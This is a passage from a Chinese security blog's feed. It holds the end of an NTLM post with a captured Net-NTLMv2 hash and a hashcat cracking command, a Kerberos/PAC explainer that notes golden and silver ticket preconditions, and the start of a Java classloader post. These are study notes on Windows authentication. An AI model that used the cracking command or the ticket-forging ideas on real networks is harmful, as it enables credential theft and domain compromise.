class="line">a::192.168.62.139:c0b5429111f9c5f4:a5f1c47844e5b3b9c6f67736a2e1916d:0101000000000000669dae86ba8bd301a9134eee81ca25de0000000002001e00570049004e002d003100550041004200430047004200470049005500330001001e00570049004e002d003100550041004200430047004200470049005500330004001e00570049004e002d003100550041004200430047004200470049005500330003001e00570049004e002d003100550041004200430047004200470049005500330007000800669dae86ba8bd30106000400020000000800300030000000000000000000000000300000e9d9e613613097d1e2f47c1fd97fa099f65dfd78075d8bdb5ca162492ea5d2990a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00360032002e00310033003900000000000000000000000000</span><br></pre></td></tr></table></figure><p>可以使用Hashcat对该Net-NTLM hash进行破解</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 5600 a::192.168.62.139:c0b5429111f9c5f4:a5f1c47844e5b3b9c6f67736a2e1916d:0101000000000000669dae86ba8bd301a9134eee81ca25de0000000002001e00570049004e002d003100550041004200430047004200470049005500330001001e00570049004e002d003100550041004200430047004200470049005500330004001e00570049004e002d003100550041004200430047004200470049005500330003001e00570049004e002d003100550041004200430047004200470049005500330007000800669dae86ba8bd30106000400020000000800300030000000000000000000000000300000e9d9e613613097d1e2f47c1fd97fa099f65dfd78075d8bdb5ca162492ea5d2990a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00360032002e00310033003900000000000000000000000000 /tmp/password.list -o found.txt --force</span><br></pre></td></tr></table></figure><p>参数：</p><ul><li>-m：hash-type，其中Net NTLM v2对应5600</li><li>-o：输出文件</li><li>-force：强制执行</li></ul><h1 id="ssp-sspi">SSP &amp;SSPI</h1><figure><img src="/2022/05/23/NTML/6308e85c-09ca-4a40-9c2b-3e310e1f2a69.jpg" alt="img"><figcaption aria-hidden="true">img</figcaption></figure><p>SSPI(Security Support Provider Interface)：这是 Windows 定义的一套接口，此接口定义了与安全有关的功能函数， 用来获得验证、信息完整性、信息隐私等安全功能，就是定义了一套接口函数用来身份验证，签名等，但是没有具体的实现。</p><p>SSP(Security Support Provider)：SSPI 的实现者，对SSPI相关功能函数的具体实现。微软自己实现了如下的 SSP，用于提供安全功能：</p><ul><li>NTLM SSP ( Challenge/Response 验证机制 )</li><li>Kerberos ( 基于 ticket 的身份验证机制 )</li><li>Cred SSP (CredSSP 凭据安全支持提供程序 )</li><li>Digest SSP (摘要式安全支持提供程序)</li><li>Negotiate SSP(协商安全支持提供程序)</li><li>Schannel SSP</li><li>Negotiate Extensions SSP</li><li>PKU2U SSP</li></ul><p>系统层面，SSP其实就是一个dll，来实现身份验证等安全功能。NTLM是基于Challenge/Response机制，Kerberos是基于ticket的身份验证。所以，我们也可以实现自己的SSP，让系统实现更多的身份验证方法，Mimikatz就自己实现了一个利用SSP机制的记录密码。</p><p>抓包的时候可以看到啊NTLMSSp是在GSSAPI下面的。</p><blockquote><p><strong>因为sspi是gssapi的变体，这里出现gssapi是为了兼容。注册为SSP的好处就是，SSP实现了了与安全有关的功能函数，那上层协议(比如SMB)在进行身份认证等功能的时候，就可以不用考虑协议细节，只需要调用相关的函数即可。而认证过程中的流量嵌入在上层协议里面。不像kerbreos，既可以镶嵌在上层协议里面，也可以作为独立的应用层协议。ntlm是只能镶嵌在上层协议里面，消息的传输依赖于使用ntlm的上层协议。</strong></p></blockquote><h1 id="引用">引用</h1><blockquote><p>https://daiker.gitbook.io/windows-protocol/ntlm-pian/4</p><p>https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html</p><p>http://davenport.sourceforge.net/ntlm.html</p><p>https://1sparrow.com/2019/12/04/Windows%20%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/</p><p>https://atsud0.me/2022/03/07/%E3%80%90%E5%9F%9F%E6%B8%97%E9%80%8F%E3%80%91%E6%B5%85%E6%B7%A1NTLM-%E5%86%85%E7%BD%91%E5%B0%8F%E7%99%BD%E7%9A%84NTLM%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;p&gt;NTLM的东西在github之前写过，但是不够详细，这里重新再过一遍。&lt;/p&gt;
&lt;p&gt;NTLM使用在Windows的工作组环境中，而kerberos则使用在域的情况下。&lt;/p&gt;
&lt;h1 id=&quot;lm-hash-ntlm-hash&quot;&gt;LM ha</summary>
      
    
    
    
    <category term="Technology" scheme="https://ghostasky.github.io/categories/Technology/"/>
    
    
    <category term="内网" scheme="https://ghostasky.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>kerberos认证&amp;PAC</title>
    <link href="https://ghostasky.github.io/2022/05/15/%E5%9F%9F%E5%A7%94%E6%B4%BE/"/>
    <id>https://ghostasky.github.io/2022/05/15/%E5%9F%9F%E5%A7%94%E6%B4%BE/</id>
    <published>2022-05-14T16:00:00.000Z</published>
    <updated>2022-07-12T06:22:27.180Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><p>这个是鸽了好久好久的，一直没写，今天补一下。还有域委派的想写一直没写......</p><p>关于详细的可以RFC文档：https://datatracker.ietf.org/doc/html/rfc4120.html</p><h1 id="kerveros认证">kerveros认证</h1><p>由三方来完成：Client,Server,KDC(密钥分发中心)。</p><p>KDC 服务默认会安装在一个域的域控中，而 Client 和 Server 为域内的用户或者是服务，如 HTTP 服务，SQL 服务。在 Kerberos 中 Client 是否有权限访问 Server 端的服务由 KDC 发放的票据来决定。</p><p>KDC由两部分组成：</p><ul><li>AS（<strong>Authentication Server</strong>）：认证服务器，专门用来认证client的身份并发放客户用于访问TGS的TGT（票据授予票据）</li><li>TGS（<strong>Ticket Granting Ticket</strong>）：票据授予服务器，用来发放整个认证过程以及客户端访问服务端时所需的服务授予票据（Ticket）</li></ul><h2 id="认证流程">认证流程</h2><p>先来看一张图：</p><figure><img src="/2022/05/15/%E5%9F%9F%E5%A7%94%E6%B4%BE/kerberos5.png" alt="img"><figcaption aria-hidden="true">img</figcaption></figure><p>当 Client 想要访问 Server 上的某个服务时，需要先向 AS 证明自己的身份，然后通过 AS 发放的 TGT 向 Server 发起认证请求，这个过程分为三块：</p><p><strong>The Authentication Service Exchange</strong>：Client 与 AS 的交互；</p><p><strong>The Ticket-Granting Service (TGS) Exchange</strong>：Client 与 TGS 的交互；</p><p><strong>The Client/Server Authentication Exchange</strong>：Client 与 Server 的交互。</p><h2 id="client--as">Client--AS</h2><h3 id="as_req">AS_REQ</h3><p><code>AS_REQ</code>中的字段在这里可以看到：<a href="https://daiker.gitbook.io/windows-protocol/kerberos/1#0x03-as_req">AS_REQ字段</a></p><p>请求中包含：用户hash加密的时间戳<code>PA-ENC-TIMESTAMP</code>，用户名。</p><p><code>AS_REQ</code>的<code>PA_DATA</code>字段中主要用到的是两个：</p><ol type="1"><li><code>PA-ENC-TIMESTAMP</code>：预认证，用户hash加密的时间戳，之后AS有用户的hash，用于解密，获得时间戳，如果时间在一定范围内，则认证通过</li><li><code>PA_PAC_REQUEST</code>：启用PAC支持的扩展，后面会写到。</li></ol><h3 id="as_rep">AS_REP</h3><p>AS向活动目录AD请求查询是否有该用户，有的话取出相应用户对应的Hash，并对 <code>AS_REQ</code> 请求中加密的时间戳<code>PA-ENC-TIMESTAMP</code>进行解密，如果解密成功，则证明客户端提供的密码正确，如果时间戳在五分钟之内，则预认证成功。之后返回TGT票据，分为两部分看下：</p><ol type="1"><li><code>ticket</code>字段(TGT)：当前KDC中krbtgt hash加密的TGT票据（<code>Session-key-AS</code>，时间戳，用户信息，到期时间等），在通信数据包中显示的就是<code>ticket</code>字段，<code>ticket</code>字段用于<code>TGS_REQ</code>的认证，是加密的，<strong>用户不可读取里面的内容</strong>。在<code>AS_REQ</code>请求里面时，是使用krbtgt的hash进行加密的，因此如果我们拥有krbtgt的hash就可以自己制作一个ticket，既黄金票据。</li><li><code>enc-part</code>字段：AS会生成一个随机数<code>Session-key-AS</code>（非常重要，作为kerberos中下一轮的认证密钥），使用用户hash加密该字段可以解密，key是用户hash，解密后得到<code>Encryptionkey</code>，其中包含<code>Session-key-AS</code>。</li></ol><p>总的来说AS_REP包含<code>Session-key-AS</code>和<code>TGT</code>（由 krbtgt HASH 加密的 <code>Session-key-AS</code>和时间戳等信息）</p><h3 id="工具导出的票据后缀">工具导出的票据后缀</h3><p>mimikatz，kekeo，rubeus生成的凭据是以<code>.kirbi</code>后缀的。</p><p>impacket 生成的凭据的后缀是<code>.ccache</code>。</p><p>这两种票据主要包含的都是 Session-key 和 TGT，因此可以相互转化。</p><h2 id="client--tgs">Client--TGS</h2><h3 id="tgs_req">TGS_REQ</h3><p>这里client拿到通过<code>AS_REP</code>拿到TGT，之后访问KDC访问特定服务。</p><p>首先通过用户hash解密<code>AS_REP</code>中<code>enc-part</code>，得到<code>Session-key-AS</code></p><p>Client使用<code>Session-key-AS</code>加密时间戳等信息，得到<code>authenticator</code>（认证符），之后连同<code>AS_REP</code>中的TGT和需要访问的服务ID一起发送给KDC中的TGS。</p><h3 id="tgs_rep">TGS_REP</h3><p>TGS首先检查是否存在Client访问的服务，若存在，使用krbtgt的hash解密TGT得到<code>Session-key-AS</code>、时间戳等信息，之后使用<code>Session-key-AS</code>解密<code>authenticator</code>部分，将得到的两部分时间戳等信息比较，如果时间相差过大则需要重新认证。</p><p>认证成功TGS会重新生成session，这里称为<code>Session-key-TGS</code>，用于确保客户端与服务器之间通信安全。</p><p>响应为两部分：</p><ol type="1"><li><code>Session-key-AS</code>加密的<code>Session-key-TGS</code></li><li>票据ST：server密码的hash加密的<code>Session-key-TGS</code>、时间戳等信息</li></ol><h2 id="client--server">Client--Server</h2><h3 id="ap_req">AP_REQ</h3><p>客户端收到TGS_REP响应后，使用<code>Session-key-AS</code>解密得到<code>Session-key-TGS</code>。</p><p>请求有两部分：</p><ol type="1"><li>新生成的<code>authenticator</code>，包含用户ID、时间戳、Client-info等信息，由<code>Session-key-TGS</code>加密</li><li>票据ST</li></ol><h3 id="ap_rep">AP_REP</h3><p>使用server密码的hash解密票据ST，得到<code>Session-key-TGS</code>、时间戳等信息；之后使用<code>Session-key-TGS</code>解密<code>authenticator</code>，得到时间戳等信息，将这两者对比校验。</p><p>通过客户端身份验证后，Server 会拿着 PAC 去询问 DC 该用户是否有访问权限，DC 拿到 PAC 后进行解密，然后通过 PAC 中的 SID 判断用户的用户组信息、用户权限等信息，然后将结果返回给服务端，服务端再将此信息域用户请求的服务资源的 ACL 进行对比，最后决定是否给用户提供相关的服务。通过认证后 Server 将返回最终的 <code>AP-REP</code> 并与 Client 建立通信。</p><h1 id="pac">PAC</h1><h2 id="介绍">介绍</h2><p>用户特权证书。一般的kerberos流程都是如上所述的，但是这里有个问题，那就是用户有没有权限访问该服务，在上面的流程里面，只要用户的hash正确，那么就可以拿到TGT，有了TGT，就可以拿到TGS，有了TGS，就可以访问服务，任何一个用户都可以访问任何服务。也就是说上面的流程解决了<code>who am i</code>的问题，并没有解决<code>What can I do</code>的问题。</p><p>于是微软引入了PAC，流程变成下面的情况：</p><ol type="1"><li><code>AS_REQ</code>：请求为用户hash加密的时间戳，KDC使用用户hash进行解密，如果结果正确返回用krbtgt hash加密的TGT票据，<strong>TGT里面包含PAC,PAC包含用户的sid，用户所在的组</strong>：<code>Ticket[Authorization Data[PAC[Signature]]]</code></li><li>用户凭借TGT票据向KDC发起针对特定服务的TGS_REQ请求，KDC使用krbtgt hash进行解密，如果结果正确，就返回用服务hash 加密的TGS票据(这一步不管用户有没有访问服务的权限，只要TGT正确，就返回TGS票据，任何一个用户，只要hash正确，可以请求域内任何一个服务的TGS票据)</li><li>用户拿着TGS票据去请求服务，服务使用自己的hash解密TGS票据。如果解密正确，就拿着PAC去KDC询问用户有没有访问权限，域控解密PAC。获取用户的sid，以及所在的组，再判断用户是否有访问服务的权限，有访问权限(有些服务并没有验证PAC这一步，这也是白银票据能成功的前提，因为就算拥有用户hash，可以制作TGS，也不能制作PAC，PAC当然也验证不成功，但是有些服务不去验证PAC，这是白银票据成功的前提）就允许用户访问。</li></ol><p>PAC对于用户和服务全程都是不可见的。只有KDC能制作和查看PAC。</p><h2 id="pac结构">PAC结构</h2><blockquote><p>这里看的daiker师傅的文章。</p></blockquote><figure><img src="/2022/05/15/%E5%9F%9F%E5%A7%94%E6%B4%BE/image001.png" alt="img"><figcaption aria-hidden="true">img</figcaption></figure><p>PAC整体上是一个AuthorizationData结构</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">AuthorizationData       ::= SEQUENCE OF SEQUENCE &#123;</span><br><span class="line">              ad-type         [0] Int32,</span><br><span class="line">              ad-data         [1] OCTET STRING</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>其中的ad-type主要有以下几个：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">AD-IF-RELEVANT                     1</span><br><span class="line">AD-INTENDED-FOR-SERVER             2</span><br><span class="line">AD-INTENDED-FOR-APPLICATION-CLASS  3</span><br><span class="line">AD-KDC-ISSUED                      4</span><br><span class="line">AD-AND-OR                          5</span><br><span class="line">AD-MANDATORY-TICKET-EXTENSIONS     6</span><br><span class="line">AD-IN-TICKET-EXTENSIONS            7</span><br><span class="line">AD-MANDATORY-FOR-KDC               8</span><br><span class="line">Reserved values                 9-63</span><br><span class="line">OSF-DCE                           64</span><br><span class="line">SESAME                            65</span><br><span class="line">AD-OSF-DCE-PKI-CERTID             66 (hemsath @us.ibm.com)</span><br><span class="line">AD-WIN2K-PAC                     128 (jbrezak @exchange.microsoft.com)</span><br><span class="line">AD-ETYPE-NEGOTIATION             129  (lzhu @windows.microsoft.com)</span><br></pre></td></tr></table></figure><p>整个PAC最外层的<code>ad-type</code>为<code>AD-IF-RELEVANT</code>，封装了另一个 <code>AD-WIN2K-PAC</code> 类型的 <code>AuthorizationData</code> 元素，结构为<a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/6655b92f-ab06-490b-845d-037e6987275f">PACTYPE</a></p><p>，意思就是这个<code>AuthorizationData</code>元素的<code>ad-type</code>为<code>AD-WIN2K-PAC</code>，而<code>ad-data</code>为一段连续的空间，结构为<a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/3341cfa2-6ef5-42e0-b7bc-4544884bf399">PAC_INFO_BUFFER</a></p><p>PACTYPE结构：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">PACTYPE</span> &#123;</span></span><br><span class="line">    ULONG cBuffers;<span class="comment">//用于定义Buffers 数组中的条目数。</span></span><br><span class="line">    ULONG Version;<span class="comment">//定义 PAC 版本的小端格式的 32 位无符号整数；必须是 0x00000000。</span></span><br><span class="line">    PAC_INFO_BUFFER Buffers[<span class="number">1</span>];<span class="comment">//PAC_INFO_BUFFER 结构的数组</span></span><br><span class="line">&#125; PACTYPE, *PPACTYPE;</span><br></pre></td></tr></table></figure><p>PAC_INFO_BUFFER结构(key-value型)：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">PAC_INFO_BUFFER</span> &#123;</span></span><br><span class="line">    ULONG ulType;<span class="comment">//描述存在于Offset处的缓冲区中的数据类型</span></span><br><span class="line">    ULONG cbBufferSize;<span class="comment">//包含 PAC 中位于Offset的缓冲区的大小（以字节为单位）</span></span><br><span class="line">    ULONG64 Offset;<span class="comment">//包含从 PACTYPE 结构开头到缓冲区开头的偏移量，以字节为单位。数据偏移量必须是八的倍数。以下部分指定每种元素的格式</span></span><br><span class="line">&#125; PAC_INFO_BUFFER, *PPAC_INFO_BUFFER;</span><br></pre></td></tr></table></figure><p>key的类型：</p><table><colgroup><col style="width: 14%"><col style="width: 85%"></colgroup><thead><tr class="header"><th style="text-align: left;">类型</th><th style="text-align: left;">意义</th></tr></thead><tbody><tr class="odd"><td style="text-align: left;">0x00000001</td><td style="text-align: left;">登录信息。PAC 结构必须包含一个这种类型的缓冲区。必须忽略其他登录信息缓冲区。</td></tr><tr class="even"><td style="text-align: left;">0x00000002</td><td style="text-align: left;">凭证信息。PAC 结构不应包含多个此类缓冲区。第二个或后续的凭证信息缓冲区在接收时必须被忽略。</td></tr><tr class="odd"><td style="text-align: left;">0x00000006</td><td style="text-align: left;">服务器校验和。PAC 结构必须包含一个这种类型的缓冲区。必须忽略其他登录服务器校验和缓冲区。</td></tr><tr class="even"><td style="text-align: left;">0x00000007</td><td style="text-align: left;">KDC（特权服务器）校验和。PAC 结构必须包含一个这种类型的缓冲区。必须忽略额外的 KDC 校验和缓冲区。</td></tr><tr class="odd"><td style="text-align: left;">0x0000000A</td><td style="text-align: left;">客户名称和票证信息。PAC 结构必须包含一个这种类型的缓冲区。必须忽略其他客户端和票证信息缓冲区。</td></tr><tr class="even"><td style="text-align: left;">0x0000000B</td><td style="text-align: left;">受约束的委派信息。PAC 结构必须包含一个用于用户到代理服务 (S4U2proxy) 请求的此类缓冲区，否则不包含。必须忽略其他受约束的委托信息缓冲区。</td></tr><tr class="odd"><td style="text-align: left;">0x0000000C</td><td style="text-align: left;">用户主体名称 (UPN) 和域名系统 (DNS) 信息。PAC 结构不应该包含多个此类型的缓冲区。第二个或后续的 UPN 和 DNS 信息缓冲区在接收时必须被忽略。</td></tr><tr class="even"><td style="text-align: left;">0x0000000D</td><td style="text-align: left;">客户索赔信息。PAC 结构不应该包含多个此类缓冲区。必须忽略其他客户端声明信息缓冲区。</td></tr><tr class="odd"><td style="text-align: left;">0x0000000E</td><td style="text-align: left;">设备信息。PAC 结构不应该包含多个此类缓冲区。必须忽略其他设备信息缓冲区。</td></tr><tr class="even"><td style="text-align: left;">0x0000000F</td><td style="text-align: left;">设备声明信息。PAC 结构不应该包含多个此类型的缓冲区。必须忽略其他设备声明信息缓冲区。</td></tr><tr class="odd"><td style="text-align: left;">0x00000010</td><td style="text-align: left;">票证校验和。PAC 结构不应包含多个此类缓冲区。必须忽略额外的票据校验和缓冲区。</td></tr><tr class="even"><td style="text-align: left;">0x00000011</td><td style="text-align: left;">PAC Attributes 指示缓冲区包含 PAC 的属性位。PAC 结构不应包含多个此类缓冲区。必须忽略其他属性缓冲区。</td></tr><tr class="odd"><td style="text-align: left;">0x00000012</td><td style="text-align: left;">PAC 请求者指示缓冲区包含请求 PAC 的主体的 SID。PAC 结构必须包含一个这种类型的缓冲区。</td></tr></tbody></table><p>说几个重要的：</p><ul><li><p>0x00000001：KERB_VALIDATION_INFO，登陆信息，是一个结构体，整个PAC最重要的部分，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">KERB_VALIDATION_INFO</span> &#123;</span></span><br><span class="line">   FILETIME LogonTime;</span><br><span class="line">   FILETIME LogoffTime;</span><br><span class="line">   FILETIME KickOffTime;</span><br><span class="line">   FILETIME PasswordLastSet;</span><br><span class="line">   FILETIME PasswordCanChange;</span><br><span class="line">   FILETIME PasswordMustChange;</span><br><span class="line">   RPC_UNICODE_STRING EffectiveName;</span><br><span class="line">   RPC_UNICODE_STRING FullName;</span><br><span class="line">   RPC_UNICODE_STRING LogonScript;</span><br><span class="line">   RPC_UNICODE_STRING ProfilePath;</span><br><span class="line">   RPC_UNICODE_STRING HomeDirectory;</span><br><span class="line">   RPC_UNICODE_STRING HomeDirectoryDrive;</span><br><span class="line">   USHORT LogonCount;</span><br><span class="line">   USHORT BadPasswordCount;</span><br><span class="line">   ULONG UserId;</span><br><span class="line">   ULONG PrimaryGroupId;</span><br><span class="line">   ULONG GroupCount;</span><br><span class="line">   [size_is(GroupCount)] PGROUP_MEMBERSHIP GroupIds;</span><br><span class="line">   ULONG UserFlags;</span><br><span class="line">   USER_SESSION_KEY UserSessionKey;</span><br><span class="line">   RPC_UNICODE_STRING LogonServer;</span><br><span class="line">   RPC_UNICODE_STRING LogonDomainName;</span><br><span class="line">   PISID LogonDomainId;</span><br><span class="line">   ULONG Reserved1[<span class="number">2</span>];</span><br><span class="line">   ULONG UserAccountControl;</span><br><span class="line">   ULONG SubAuthStatus;</span><br><span class="line">   FILETIME LastSuccessfulILogon;</span><br><span class="line">   FILETIME LastFailedILogon;</span><br><span class="line">   ULONG FailedILogonCount;</span><br><span class="line">   ULONG Reserved3;</span><br><span class="line">   ULONG SidCount;</span><br><span class="line">   [size_is(SidCount)] PKERB_SID_AND_ATTRIBUTES ExtraSids;</span><br><span class="line">   PISID ResourceGroupDomainSid;</span><br><span class="line">   ULONG ResourceGroupCount;</span><br><span class="line">   [size_is(ResourceGroupCount)] PGROUP_MEMBERSHIP ResourceGroupIds;</span><br><span class="line">&#125; KERB_VALIDATION_INFO, *PKERB_VALIDATION_INFO;</span><br></pre></td></tr></table></figure></li><li><p>0x00000006：服务器校验和；0x00000007：KDC（特权服务器）校验和。</p><ul><li><p>分别由server密码和KDC密码加密，是为了防止PAC内容被篡改。</p></li><li><p>存在签名的原因有两个。首先，存在带有服务器密钥的签名，以防止客户端生成自己的PAC并将其作为加密授权数据发送到KDC，以包含在票证中。其次，提供具有KDC密钥的签名，以防止不受信任的服务伪造带有无效PAC的票证。</p></li><li><p>两个都是PAC_SIGNATURE_DATA结构：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">PAC_SIGNATURE_DATA</span> &#123;</span></span><br><span class="line">    ULONG SignatureType;<span class="comment">//4字节，必须为下表中的值之一</span></span><br><span class="line">    UCHAR Signature[ANYSIZE_ARRAY];<span class="comment">//包含校验和。签名的长度由SignatureType字段的值确定</span></span><br><span class="line">&#125; PAC_SIGNATURE_DATA, *PPAC_SIGNATURE_DATA;</span><br></pre></td></tr></table></figure><table><thead><tr class="header"><th style="text-align: left;">值</th><th style="text-align: left;">意义</th></tr></thead><tbody><tr class="odd"><td style="text-align: left;">KERB_CHECKSUM_HMAC_MD5<br>0xFFFFFF76</td><td style="text-align: left;">签名大小为 16 个字节。十进制值为 -138。</td></tr><tr class="even"><td style="text-align: left;">HMAC_SHA1_96_AES128<br>0x0000000F</td><td style="text-align: left;">签名大小为 12 个字节。十进制值为 15。</td></tr><tr class="odd"><td style="text-align: left;">HMAC_SHA1_96_AES256<br>0x00000010</td><td style="text-align: left;">签名大小为 12 个字节。十进制值为 16。</td></tr></tbody></table></li></ul></li><li><p>0x0000000A：PAC_CLIENT_INFO，客户名称和票证信息，也是一个结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">PAC_CLIENT_INFO</span> &#123;</span></span><br><span class="line">    FILETIME ClientId;<span class="comment">//小端格式的FILETIME结构，包含 Kerberos 初始票证授予票证 (TGT)身份验证时间</span></span><br><span class="line">    USHORT NameLength;<span class="comment">//用于指定Name 字段的长度</span></span><br><span class="line">    WCHAR Name[<span class="number">1</span>];<span class="comment">//包含客户帐户名称的小端格式的 16 位 Unicode 字符数组</span></span><br><span class="line">&#125; PAC_CLIENT_INFO, *PPAC_CLIENT_INFO;</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;p&gt;这个是鸽了好久好久的，一直没写，今天补一下。还有域委派的想写一直没写......&lt;/p&gt;
&lt;p&gt;关于详细的可以RFC文档：https://datatracker.ietf.org/doc/html/rfc4120.html&lt;/p&gt;
&lt;h1 i</summary>
      
    
    
    
    <category term="Technology" scheme="https://ghostasky.github.io/categories/Technology/"/>
    
    
    <category term="内网" scheme="https://ghostasky.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>Java-类加载器</title>
    <link href="https://ghostasky.github.io/2022/04/20/Java-%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/"/>
    <id>https://ghostasky.github.io/2022/04/20/Java-%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/</id>
    <published>2022-04-19T16:00:00.000Z</published>
    <updated>2022-07-12T06:26:47.628Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h1 id="前言流程">前言+流程</h1><p>java语言依赖JVM，运行的时候，需要先编译成class文件，之后java类初始化的时候会调用<code>java.lang.ClassLoader</code>加载类字节码，ClassLoader会调用JVM的native方法来定义一个<code>java.lang.Class</code>实例。</p><figure><img src="/2022/04/20/Java-%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/JvmSpec7.png" alt="JVM"><figcaption aria-hidden="true">JVM</figcaption></figure><p>类文件编译流程：</p><figure><img src="/2022/04/20/Java-%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/20210108150835-53436af4-5180-1.png" alt="img"><figcaption aria-hidden="true">img</figcaption></figure><p>示例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.yutao.day1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClassLoaderLearn</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以通过jdk自带的javap命令反汇编查看class文件对应的<code>com.yutao.day1.ClassLoaderLearn</code>类，</p><figure><img src="/2022/04/20/Java-%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/image-20220421161921106.png" alt="image-20220421161921106"><figcaption aria-hidden="true">image-20220421161921106</figcaption></figure><p>JVM在执行<code>ClassLoaderLearn</code>之前会先解析class的二进制内容，JVM执行的其实就是如上<code>javap</code>命令生成的字节码。</p><figure><img src="/2022/04/20/Java-%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/image-20220421161945724.png" alt="image-20220421161945724"><figcaption aria-hidden="true">image-20220421161945724</figcaption></figure><h1 id="双亲委派模型">双亲委派模型</h1><blockquote><p>类加载阶段分为加载、连接、初始化三个阶段，而加载阶段需要通过类的全限定名来获取定义了此类的二进制字节流。<strong>Java特意把这一步抽出来用类加载器来实现</strong>。把这一步骤抽离出来使得应用程序可以按需自定义类加载器。并且得益于类加载器，OSGI、热部署等领域才得以在JAVA中得到应用。</p><p>在Java中<strong>任意一个类都是由这个类本身和加载这个类的类加载器来确定这个类在JVM中的唯一性</strong>。也就是你用你A类加载器加载的<code>com.aa.ClassA</code>和你A类加载器加载的<code>com.aa.ClassA</code>它们是不同的，也就是用<code>instanceof</code>这种对比都是不同的。所以即使都来自于同一个class文件但是由不同类加载器加载的那就是两个独立的类。</p></blockquote><figure><img src="/2022/04/20/Java-%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/20210108151613-642298d0-5181-1.png" alt="img"><figcaption aria-hidden="true">img</figcaption></figure><figure><img src="/2022/04/20/Java-%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/sqqqqq.png" alt="双亲委派模型"><figcaption 